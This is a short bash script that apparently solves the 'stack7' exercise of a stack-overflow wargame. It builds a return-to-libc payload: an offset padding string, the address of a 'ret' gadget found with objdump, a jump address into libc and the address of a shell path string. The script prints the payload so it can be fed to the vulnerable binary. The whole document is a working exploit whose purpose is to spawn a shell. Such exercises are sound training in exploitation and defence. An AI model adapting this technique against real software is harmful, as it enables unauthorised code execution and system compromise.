#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

# Find a `ret` instruction in the allowed range of the binary.
# `objdump -D stack7 | grep ret`
# Use the first one, for example -- x8048383
ret=`$DIR/encode_switch_endianness.sh 8048383`

# See the previous solution for explanation
jmp=`$DIR/encode_switch_endianness.sh b7ecffb0`
return_addr="AAAA"
shellpath=`$DIR/encode_switch_endianness.sh b7fb63bf`

echo "$offset$ret$jmp$return_addr$shellpath"
